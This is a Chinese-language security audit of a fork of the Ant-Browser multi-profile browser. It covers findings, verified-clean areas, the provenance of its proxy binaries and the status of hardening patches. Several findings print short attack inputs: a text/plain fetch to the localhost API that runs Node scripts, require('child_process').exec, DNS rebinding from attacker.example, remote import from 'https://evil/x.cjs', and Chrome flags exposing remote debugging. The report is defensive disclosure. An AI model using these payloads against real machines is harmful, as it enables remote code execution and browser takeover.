# Ant-Browser Fork 安全审计报告

> 审计日期：2026-07-19  
> 审计对象：fork `github.com/lxinfei5/Ant-Browser`，基线上游 tag `V1.2.0`（black-ant/Ant-Browser）  
> 方法：两条对抗式多 Agent Workflow（源码攻击面 + 供应链/二进制），每条 finding 经独立 Agent 尝试反驳（adversarial verify），再合并人工外部核验（上游二进制哈希比对）。  
> 规模：85 条候选 finding → **78 条 confirmed**（源码 46 + 供应链 32），7 条 refuted。  
> 结论速览：**无后门、无遥测、无隐蔵回连、committed 二进制确为官方上游构建**；但存在 **一条 CRITICAL 的本地未鉴权自动化 API → 远程网页 CSRF → Node RCE 链**，以及若干 HIGH 级别设计性弱点（CDP 反代无 Origin 校验、凭据明文入日志、自动化脚本无沙箱）。对 fork 的账号池用途而言，这些必须在对外暴露 API 前修复。

---

## 1. 执行摘要

| 级别 | 数量 | 是否需在对外用前修复 |
|---|---|---|
| Critical | 1 | ✅ 必须 |
| High | 14 | ✅ 必须 |
| Medium | 16 | 建议 |
| Low | 13 | 视场景 |
| Info（确认安全/阴性） | 34 | — |

### 已确认“干净”的方面（阴性结论，重要）
- **无后门/无遥测/无回连**：go.mod 与 frontend/package.json 无 sentry/posthog/mixpanel/amplitude/umami/gtag/Bugsnag；无自更新/版本检查回连；无 license 激活回连。唯一“回连”是用户主动触发的 IP 健康探针。
- **committed 代理二进制确为官方上游**：`bin/*` 的 10 个 xray/sing-box 二进制（~350MB）经 `publish/runtime-manifest.json`（逐文件 sha256）+ `publish/runtime-sources.json`（官方 GitHub release URL + 归档 sha256）双重 pin。人工外部核验：Xray 的 `archiveSha256` 与官方 `.dgst` 完全一致（linux-amd64 `29ce535b…`、darwin-arm64 `adec4685…`、darwin-amd64 `2baa1914…`）；sing-box darwin-arm64 官方归档 sha256 `6dd10bb5…` 与 pin 一致。已提交二进制的哈希与 manifest 一致。`tools/runtime/sync-runtime.py` 强制 sha256 校验，`--force-download` 仅绕过缓存不绕过哈希。
- **嵌入式资源无藏毒**：`runner.cjs / runner_shared.cjs / runner_page_api.cjs / runner_script_loader.cjs` 为可读 CommonJS，无混淆、无大段 base64/hex、无远程 require、无 eval 网络输入，仅连 `127.0.0.1` CDP。`build/appicon.png`（952KB）为合法 1024² RGBA 图标，IEND 后零字节，无隐藏载荷。`icon.ico` 合法。
- **安装器/打包脚本无远程拉取**：NSIS 安装器不下载、不写自启、不含捆绑；linux/mac 打包仅本地 `npm ci + wails build`；OpenClaw skill 安装脚本仅本地复制+写配置+调 `127.0.0.1:19876`，无 `curl|bash`/`iex`/`DownloadString`。
- **进程启动无 shell 注入**：全仓库无 `exec.Command(..., "/bin/sh", "-c", ...)`；chrome/xray/mihomo/sing-box/node/git 均以 argv 数组启动。
- **API key 比较为常量时间**（`crypto/subtle.ConstantTimeCompare`），无时序侧信道。

### 最严重的一条链（CRITICAL）
本地 LaunchServer 默认 `127.0.0.1:19876` **鉴权关闭**，且 `/api/automation/scripts/run` 可执行 Node 自动化脚本（`require()` 加载，无沙箱）。任意网页只需让用户访问即可用 `Content-Type: text/plain` 发起 CORS 简单请求（免预检），服务器 `json.NewDecoder` 不校验 Content-Type 即解析 body → **远程网页 → 受害者机器 Node RCE**，零交互。即使启用 `X-Ant-Api-Key` 也只保护 `/api/*`，不保护 `/` CDP 通道。

---

## 2. Critical / High（必须修复）

### C1 — 本地未鉴权自动化 API → 远程网页 CSRF → Node RCE  ⏤ CRITICAL
- 位置：`backend/internal/launchcode/server_http.go`（路由）、`auth.go:75`（默认放行）、`backend/internal/automation/assets/runner_script_loader.cjs:13`（`require()` 无沙箱）、`server_http_launch.go:69`（`json.NewDecoder` 不校验 Content-Type）
- 利用：受害者访问恶意站点 → `fetch('http://127.0.0.1:19876/api/automation/scripts/run',{method:'POST',headers:{'Content-Type':'text/plain'},body:JSON.stringify({scriptId,...})})` → 免预检 → 执行 Node 脚本（`child_process` 可用）→ RCE。也可 `GET /api/launch/{code}` 经 `<img src>` 触发启动实例。
- 缓解现状：现代 Chromium 的 Private Network Access 可在 enforcing 构建里阻断跨源→localhost；但 Firefox/Safari/旧 Chromium 不阻断，且任何**本地进程**可直接打，完全无缓解。
- 修复：默认开启 `X-Ant-Api-Key` 并强制非空（fail-closed）；对所有 state-changing `/api/*` 校验 `Origin`/`Sec-Fetch-Site` 或要求自定义 header；`/` CDP 通道同样加 Origin 白名单或 token；自动化脚本沙箱化（禁 `child_process`/`fs`/`net`/`vm`）。

### H1 — CDP 反代 `/` 无鉴权无 Origin 校验，DNS 重绑定/浏览器驻留攻击可接管浏览器  ⏤ HIGH
- 位置：`backend/internal/launchcode/server_http_utils.go:29`（`NewSingleHostReverseProxy` 仅设 ErrorHandler，默认 Director，无 Origin 白名单）；`auth.go:70`（非 `/api/` 路径不经 apiAuthMiddleware）
- 利用：用户访问 `attacker.example`，攻击者 DNS 重绑定到 `127.0.0.1` → 页面 fetch `/json/list` 取 target id → `ws://127.0.0.1:19876/devtools/page/<id>`（CDP WS 不校验 Origin）→ 读 cookie、执行 JS、导航、外渗。**即便启用 X-Ant-Api-Key 也无效**（它不覆盖 `/`）。
- 修复：CDP 反代增加 Origin 白名单 + 对 `/devtools/*` 要求 token/本地 token；或关闭对 `/` 的 WS 升级、仅允许白名单来源。

### H2 — 默认（鉴权关闭）允许任意网页 CSRF 到管理 API  ⏤ HIGH
- 位置：`backend/internal/launchcode/server_http_launch.go:55`；`config_defaults.go:288`（`Enabled=false/APIKey=""`）
- 利用：`Content-Type: text/plain` 使请求为 CORS simple request 免预检；`json.NewDecoder` 忽略 Content-Type → 启动浏览器 / 跑自动化 / 停实例。设非空 key 才会因自定义 header 触发预检而失败。
- 修复：见 C1。

### H3 — 代理凭据明文写入启动日志  ⏤ HIGH
- 位置：`backend/app_instance_start_proxy.go:56`（结构化日志字段 `profile_proxy_config`/`temporary_proxy_config`/`resolved_proxy_config` 原样含 user:pass）
- 利用：开启文件日志或控制台重定向 → 任何能读日志者恢复代理账密。
- 修复：日志前对 ProxyConfig 做 userinfo 脱敏（`user:***@host`）。

### H4 — `/api/launch/logs` 暴露内存中的 ProxyConfig 凭据（默认无鉴权）  ⏤ HIGH
- 位置：`backend/internal/launchcode/server_logs.go:11`（保留最近 500 条 API 调用记录，含 LaunchRequestParams.ProxyConfig 凭据）
- 利用：任何本地进程 `GET /api/launch/logs?limit=200` 读取一次性/临时 launch 请求里的代理账密。
- 修复：日志记录前脱敏 ProxyConfig；或对该端点强制鉴权。

### H5 — `FingerprintArgs` 绕过 `sanitizeManagedLaunchArgs`，原样拼入 Chrome 命令行  ⏤ HIGH
- 位置：`backend/app_instance_start_prepare.go:311`
- 利用：经未鉴权 `/api/profiles`（含 `fingerprintArgs=["--remote-debugging-address=0.0.0.0","--remote-debugging-port=9222"]`）+ `autoLaunch=true` → 受害者 Chrome 在 `0.0.0.0:9222` 暴露完整 CDP；或 `--proxy-pac-url`/`--ignore-certificate-errors` MITM 流量。
- 修复：`FingerprintArgs` 也走 sanitizer；白名单允许的指纹 flag，拒绝安全相关 flag。

### H6 — LaunchServer profile/launch API 默认无鉴权、接受攻击者控制参数  ⏤ HIGH
- 位置：`backend/internal/launchcode/auth.go:76`
- 利用：本地进程或 `text/plain` POST 创建带任意 `FingerprintArgs`/`UserDataDir` 的 profile 并 autoLaunch，串联 H5/path-traversal。
- 修复：见 C1（默认鉴权 + Origin 校验）。

### H7 — 自动化 runner 以 `require()` 加载用户脚本，无沙箱全 Node 权限（RCE by design）  ⏤ HIGH
- 位置：`backend/internal/automation/assets/runner_script_loader.cjs:13`
- 利用：任何创建/导入自动化脚本者写 `require('child_process').exec(...)` → 以用户身份执行任意命令、读其他 profile 的 user-data、外渗。
- 修复：受限模块加载器 / vm 沙箱 / 能力白名单；禁止 `child_process`、`fs`（除白名单）、`net`、`vm`。

### H8 — 脚本导入校验器的 nodeBuiltinModules 白名单放行 child_process/fs/os/net/vm  ⏤ HIGH
- 位置：`backend/internal/automation/script_package_validator_resolve.go:134`
- 利用：经 git 导入的脚本包 `require('child_process')` 仍通过校验 → RCE。
- 修复：白名单改为显式拒危险模块。

### H9 — 经 Store 创建/编辑的脚本完全绕过导入校验  ⏤ HIGH
- 位置：`backend/internal/automation/scripts_store.go:180`
- 利用：编辑器粘贴含 `require('child_process')` 的脚本直接运行，无告警；动态 require 正则可被 `globalThis['req'+'uire']` 绕过。
- 修复：编辑器路径同样跑校验；校验改语义分析而非正则。

### H10 — `AutomationProbeSystemNode` 执行任意调用方提供的二进制路径  ⏤ HIGH
- 位置：`backend/automation_settings_api.go:88`（`exec.CommandContext(nodePath, "-e", script)`）
- 利用：有 webview binding 访问权的恶意页调 `AutomationProbeSystemNode("/tmp/evil")` → 任意代码执行。
- 修复：nodePath 限定为已注册/可信 Node 路径，拒绝任意路径。

### H11 — `AutomationScriptImportRemote` 下载远程脚本随后由 Node 执行（remote RCE by design）  ⏤ HIGH
- 位置：`backend/automation_script_import_entry.go:100`
- 利用：webview 攻击者 `AutomationScriptImportRemote('https://evil/x.cjs')` → `AutomationScriptRun` → Node 执行，含 CDP/profile/本地文件访问；也可经未鉴权 `/api/automation/hooks` 触发。
- 修复：远程导入需显式确认 + 哈希校验；或禁用远程导入。

### H12 — 代理核心二进制从 GitHub 下载后无签名/校验直接执行（MITM → RCE）  ⏤ HIGH（供应链）
- 位置：`backend/app_proxy_core_download.go:246`、`app_proxy_core_download_http.go:92/212`
- 利用：`BrowserProxyCoreDownload` 取 GitHub release asset 直接落盘 + `EnsureExecutable` + `exec.Command`，全程无 sha256/签名；且请求经用户配置的（可能为 `http://`）下载代理；`badTokens` 列表**主动排除** `.sig/.asc/checksum` 资产 → 校验文件被丢弃。MITM/恶意 CA/恶意代理 → 替换 xray/mihomo/sing-box 二进制 → 代码执行。
- 默认版本 xray `v26.3.27`/sing-box `v1.13.13` 与 manifest pin（`v26.2.6`/`v1.12.17`）不一致；**mihomo 完全不在 manifest 内**。
- 修复：下载后强制比对该版本的官方 sha256（取自上游 `.dgst`/checksums）；钉死 host 为 `github.com`/`objects.githubusercontent.com` 且强制 https；不排除校验资产而是**使用**它们；mihomo 纳入 manifest。

### H13 — `resolveBinary()` 执行 `bin/*` 不在运行时复验 sha256  ⏤ HIGH（供应链，需写权限前置）
- 位置：`backend/internal/proxy/xray_runtime_binary.go:20`、`singbox_runtime_helpers.go:15`
- 利用：被替换的 `bin/*`（经别处漏洞/恶意备份导入/篡改分发改入）直接被执行为核心，无检测。
- 修复：首次执行前比对该平台 manifest sha256，不匹配则拒绝启动。

### H14 — `frontend/dist` 被 gitignore，committed 仓库无法复现发布 UI  ⏤ MEDIUM（供应链，归入下节）
见 §3 M8。

---

## 3. Medium（建议修复）

- **M1** API 鉴权 opt-in 默认关闭，所有 `/api/*` 对本机任意进程开放 — `auth.go:68`。
- **M2** 启用但 key 为空时 fail-open（仅 Warn 日志，实际无鉴权）— `auth.go:35`。建议 fail-closed。
- **M3** `proxyConfigLogPrefix` 截断而非脱敏 userinfo，短 URL 全量泄露凭据 — `app_extension_api.go:216`。
- **M4** `sanitizeManagedLaunchArgs` 仅剥离 7 个 managed flag，其余危险 flag（`--ignore-certificate-errors`、`--proxy-pac-url`）直通 — `browser_launch_args.go:13`。
- **M5** `ResolveUserDataDir` 接受绝对路径与 `../` 相对路径，可逃出 data root — `backend/internal/browser/environment.go:23`。
- **M6** `StartURLs` 不过滤 `--` 前缀，light-start 关闭时可注入 flag — `app_instance_launch_args.go:151`。
- **M7** LaunchServer 反代 `/` 到活动实例 CDP，固定端口 19876 无鉴权暴露 DevTools — `server_http_utils.go:29`（同 H1）。
- **M8** 无 CSP：Wails assetserver 仅设 Assets/BackgroundColour，前端拥有全部 Go binding，无纵深防御 — `main.go:256`。
- **M9** 默认 IP 健康探针 `https://my.ippure.com/v1/info` 为厂商自有非 CDN 域，每次探针带上出口 IP + `AntChrome/1.0` UA — `backend/internal/proxy/iphealth.go:15`。建议改为可配置/默认关闭/用公共 204 端点。
- **M10** `FetchRemoteAuthorProfile` 远程作者配置拉取已全链路接线（前端 Profile 页），默认 URL 空（禁用），注释指向厂商 `static.antblack.de`；可被轻量激活为远程配置/回连通道 — `backend/app_profile.go:21`。建议删除该接线或钉死并显式确认。
- **M11** SSRF：`AutomationScriptInvokePublicAPI` / `FetchRemoteAuthorProfile` / `BrowserProxyFetchClashByURL` 从 Go 进程发起到任意 http(s) URL，无私网/元数据端点过滤（可读 `169.254.169.25254`） — `backend/automation_script_public_api_invoke.go:39`。
- **M12（供应链）** 运行时代理核心下载默认版本偏离 manifest pin，mihomo 不在 manifest — `app_proxy_core_download.go:203`（见 H12）。
- **M13（供应链）** `frontend/package.json` `postinstall` 触发嵌套 `npm install` 拉取原生 rollup 二进制（`ensure-rollup-native.mjs`）— 注册表/MITM → 原生二进制落开发机 — `frontend/package.json:8`。建议 pin 版本 + 校验或移除。
- **M14（供应链）** `sync-runtime.py` 不拒绝重定向到非 github host（靠 archiveSha256 兜底，可接受）— `tools/runtime/sync-runtime.py:107`。
- **M15（供应链）** postinstall/lockfile：lockfile 中 111/356 包解析自 `npmmirror.com`（均带 sha512，可校验，但第三方镜像硬编码入解析链）— `frontend/package-lock.json:1`。
- **M16（供应链）** `frontend/package.json` 全部 caret 范围，`dev.sh/dev.bat` 用 `npm install`（可改 lockfile）而非 `npm ci` — 依赖 lockfile 才可复现 — `frontend/package.json:17`。

---

## 4. Low（视场景）

- **L1** 单实例 IPC 为未鉴权 loopback TCP，仅接受 `activate` 行（影响仅限窗口聚焦）— `single_instance.go:41`。
- **L2** 代理凭据 SQLite 明文存储（`browser_proxies.proxy_config`/`browser_profiles.proxy_config`），无加密/KDF — `backend/internal/database/sqlite.go:20`。本地单用户可接受。
- **L3** xray/mihomo/sing-box 桥配置文件以 `0644` 写入，含上游代理凭据，多用户主机可读 — `xray_runtime_config.go:87`。建议 `0600`。
- **L4** `git clone repoURL` 作为裸 argv 元素，repoURL 以 `-` 开头可作 git option 注入 — `automation_script_import_git.go:27`。
- **L5** Chrome 扩展下载经 Google `update2/crx` 端点（官方、用户主动触发、泄露扩展 ID + 伪装 UA）— `extension_manager.go:62`。
- **L6** 代理核心下载 `latest` 经 GitHub API 版本解析（非 pin，上游轮换则变）— `app_proxy_core_download_http.go:92`。
- **L7** 自动化运行时缺省时从 `nodejs.org`/`registry.npmjs.org` 下载 Node + playwright-core（带 SHASUMS256）— `runtime_types.go:94`。
- **L8（供应链）** Windows 二进制 `bin/xray.exe`/`bin/sing-box.exe` 不在 `runtime-sources.json`（只有 manifest 终态哈希，无上游归档 pin，不可经 sync 复现）— `publish/runtime-sources.json:1`。
- **L9（供应链）** `publish-linux.sh`/`publish-mac.sh` 支持 `--skip-runtime-verify` 绕过哈希校验（本地逃生口，CI 受保护）— `publish/linux/publish-linux.sh:45`。
- **L10（供应链）** `bin/README.md` "unsigned internal builds" 措辞误导（实为官方上游构建，仅 app 未 codesign）— `bin/README.md:15`。
- **L11（供应链）** `runner.*.cjs` 手工维护无构建/lint 门 — `runner.cjs:1`。
- **L12（供应链）** `go.mod` ~30 个依赖钉到 commit 伪版本（含 metacubex/gitlab/sr.ht），均有 go.sum 校验，但无 release tag 审阅 — `go.mod:64`。
- **L13（供应链）** `GOPROXY=https://goproxy.cn,direct`、`GOSUMDB=sum.golang.google.cn`（受信镜像，GOSUMDB 未关，校验仍开）— `dev.sh:69`。

---

## 5. 确认安全（阴性，节选）

- 无 `shell=true`/`/bin/sh -c`，全 argv 启动（`app_instance_start_execute.go:16`）。
- 嵌入式 runner.cjs 无 phone-home/远程模块/eval 网络输入（`runner.cjs:1`）。
- `build/appicon.png`/`icon.ico` 合法无藏毒（`build/appicon.png:1`）。
- Wails binding 不注入到被托管浏览器页面，恶意站点无法经 Wails binding 提权（`main.go:297`）。
- 前端无 CDN/远程运行时脚本，dist 由 src 重建，无隐藏 bundle（`frontend/index.html:1`）。
- localStorage 仅存非敏感 UI 状态；无 `eval`/`innerHTML`/`document.write` sink（`automationScripts.ts:400`）。
- 连通性/测速探针命中 gstatic/cloudflare/msftconnecttest 标准 204 端点，仅对已配置代理运行（`utils_connectivity.go:141`）。
- 控制面全 loopback；X-Ant-Api-Key 常量时间比较且不入日志（`auth.go:82`）。
- 无任何自启动守护（tray 仅前台驻留，无 Run key/LoginItems/launchd/systemd/XDG autostart）。
- 无遥测/分析/崩溃上报/license 回连（`go.mod:1`）。

---

## 6. 二进制来源（人工外部核验）

| 项 | 结果 |
|---|---|
| `bin/*` 10 个二进制 vs `runtime-manifest.json` | 哈希一致 ✅ |
| Xray `archiveSha256` vs 官方 `.dgst`（linux-64/macos-arm64/macos-64） | 完全一致 ✅ |
| sing-box darwin-arm64 官方归档 sha256 vs pin `6dd10bb5…` | 一致 ✅ |
| `sync-runtime.py` 强制 sha256、`--force-download` 不绕过哈希 | ✅ |
| Windows 二进制无 sources pin（仅终态哈希） | ⚠️ L8 |
| 运行时下载（H12）与运行时执行（H13）**不**复验哈希 | ❌ HIGH |

**结论：committed 二进制确为官方上游、未被篡改；但“运行时下载并执行新二进制”这条路径无完整性校验，是真实供应链风险。**

---

## 7. 对 fork 账号池用途的针对性建议

本计划（`docs/fork-ant-browser-plan.md` Phase 3）要把 LaunchServer API 对外暴露给爬虫 worker。**在实现 pool API 之前必须**：

1. **默认开启并强制非空 `X-Ant-Api-Key`**，fail-closed（M2/C1）。
2. **CDP `/` 反代 + 所有 state-changing `/api/*` 加 Origin 校验/自定义 header**，封堵 DNS 重绑定与 CSRF（H1/H2/C1）。
3. **自动化脚本沙箱化**或在本 fork 用途下直接禁用远程/脚本导入（H7/H8/H9/H10/H11）—— 账号池 worker 走 CDP，不需要 Node 自动化。
4. **代理凭据日志脱敏 + `/api/launch/logs` 脱敏/鉴权**（H3/H4/M3）。
5. **`FingerprintArgs`/`LaunchArgs` 走白名单 sanitizer**，禁止安全相关 flag（H5/M4/M6）。
6. **`UserDataDir` 限定在 data root 内**，拒绝绝对/`..`（M5）。
7. **运行时代理核心下载强制校验官方 sha256 + host 钉死 + 启用校验资产**，或在本 fork 中禁用运行时下载、只用 manifest pinned 的 committed 二进制（H12/M12）。
8. **执行 `bin/*` 前复验 manifest sha256**（H13）。
9. 关闭/可配置 IP 健康探针默认端点（M9）；删除 `FetchRemoteAuthorProfile` 接线或显式确认（M10）。
10. 对外发布前 `npm ci` + 重建 `frontend/dist` 并比对，把 dist 纳入可审计（M8/M16）。

---

## 8. 方法与可复现

- 源码审计：6 维 finder（CDP/LaunchServer、凭据、进程/命令注入、代码注入/嵌入、网络出口、前端/Wails）→ 逐 finding 独立对抗 verify（默认 refute）。脚本：`…/workflows/scripts/sec-audit-source-wf_45f485e2-b0a.js`。
- 供应链审计：5 维 finder（二进制来源、嵌入 blob、依赖、下载/安装器、更新/遥测/持久化）→ 同样对抗 verify。脚本：`…/workflows/scripts/sec-audit-supplychain-wf_ceb824a0-1d9.js`。
- 人工外部核验：`gh release download` 取上游 `.dgst`/归档，本地 `shasum -a 256` 比对（见 §6）。
- 全部 finding 含 `file:line`、claim、exploit_scenario、verifier notes；refuted 项未列入本报告。

---

## 9. 修复状态 (feat/security-hardening)

> 2026-07-19 实现并对抗式验证。分支 `feat/security-hardening`（独立 worktree `Ant-Browser-security/`），未提交，待评审合并。补丁规模：39 文件，+597/-87，新增 5 个文件（`app_proxy_core_download_integrity.go`、`server_http_security.go`、`internal/netguard/`、`proxy/redact.go`、`proxy/runtime_verify.go`）。

### 逐项状态
| # | 修复 | 状态 |
|---|---|---|
| 1 | 默认开启 + fail-closed API key（首运行自动生成并落盘 config.yaml） | ✅ done |
| 2 | `/` CDP Origin 校验 + state-changing `/api/*` CSRF（Content-Type + Sec-Fetch-Site） | ✅ done |
| 3 | 代理凭据日志/`/api/launch/logs` 脱敏（`proxy.RedactProxyConfig`） | ✅ done |
| 4 | `FingerprintArgs`/`LaunchArgs` 走 denylist sanitizer（含单连字符归一化） | ✅ done |
| 5 | `UserDataDir` 限定 data root（拒绝绝对/`..`，11 处调用方改 error 处理） | ✅ done |
| 6 | 运行时核心下载完整性（https + host 钉死 + GitHub digest → pinned archiveSha256 → 官方 checksum 资产） | 🟡 partial |
| 7 | 执行 `bin/*` 前复验 manifest sha256（mismatch 拒绝；无 entry/无 manifest 则 warn 放行，避免 brick） | 🟡 partial |
| 8 | 自动化沙箱（拒 `child_process`/`vm`，store 脚本同样校验；`AutomationProbeSystemNode` 限注册 Node；远程导入默认禁用+confirm） | ✅ done |
| 9 | SSRF 守卫（`internal/netguard`，解析后校验私网/元数据/ULA/loopback，DNS-rebinding 抗） | ✅ done |
| 10 | IP-health 可配置 + 中性 UA + `FetchRemoteAuthorProfile` SSRF 守卫（空 URL 即 opt-out） | ✅ done |
| 11 | Wails assetserver 严格 CSP | ✅ done |
| 12 | 桥配置文件 `0600` | ✅ done |
| 13 | StartURLs `--` 前缀注入守卫 | ✅ done |
| 14 | `git clone` option 注入守卫 | ✅ done |

### 验证结果
- `go build ./backend/... ./backend/internal/...`：**PASS**（exit 0）
- `go vet ./backend/...`：**PASS**
- `go test ./backend/internal/{automation,launchcode,proxy}/...`：**PASS**（含初版回归的 3 个 automation 测试已修复）
- 对抗式 diff 审查发现并已修复：HIGH `fs` denylist 误伤内置 demo（改为仅拒 `child_process`/`vm`）；MEDIUM 单连字符绕过 denylist（已归一化前导连字符）；MEDIUM `cdp_probe.py` 无 key 流被 403（已改为自动从 stateRoot config 读 key，`docs/fork/scripts/cdp_probe.py`）。

### 已知 follow-up（不阻塞合并，建议尽快）
- **#6/#7**：pin mihomo 真实 `archiveSha256` 与 `runtime-manifest` sha256（当前经 GitHub asset digest 校验，离线无 digest 时仅 warn）；为所有 shipped 二进制路径补全 manifest entry（windows `bin/windows-amd64/`、mihomo）。
- **#8**：`fs`/`os`/`net` 未禁（保留脚本 I/O 能力）；如需对用户脚本更严，改为对 builtin/runner 资产豁免后再收紧。
- 文档：`docs/fork/00-baseline.md` 的 Playwright 接入段与 `RUNBOOK-phase0.md` 已说明默认鉴权与 key 读取方式。

### 对 fork 账号池的净影响
默认鉴权 + CDP Origin 校验后，**pool worker 必须带 `X-Ant-Api-Key`** 调 lease/start/stop；本地 CDP 传输（`connect_over_cdp`）仍无需 key（Playwright 无 Origin 头 → 放行）。这正是 Phase 3 暴露 API 前需要的安全基线。